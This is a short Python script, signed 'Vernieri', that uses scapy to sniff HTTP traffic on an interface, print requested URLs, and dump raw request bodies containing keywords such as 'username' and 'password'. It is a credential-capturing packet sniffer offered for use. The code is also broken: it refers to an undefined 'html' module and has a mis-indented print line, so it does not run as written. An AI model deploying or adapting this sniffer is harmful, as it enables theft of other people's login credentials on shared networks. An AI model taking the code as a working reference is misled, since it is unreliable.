#! /usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=cb)

def cb(packet):
  if packet.haslayer(http.HTTPRequest):
    url = packet[html.HTTPRequest].Host + packet[http.HTTPRequest].Path
    print(url)
    if packet.haslayer(scapy.Raw):
      load = packet[scapy.Raw].load
      keywords = ["username", "user", "login", "password", "pass"]
      for keyword in keywords:
        if keyword in load:
        print(load)
        break

#choose your interface
sniff("eth0")
	
  
#Vernieri  
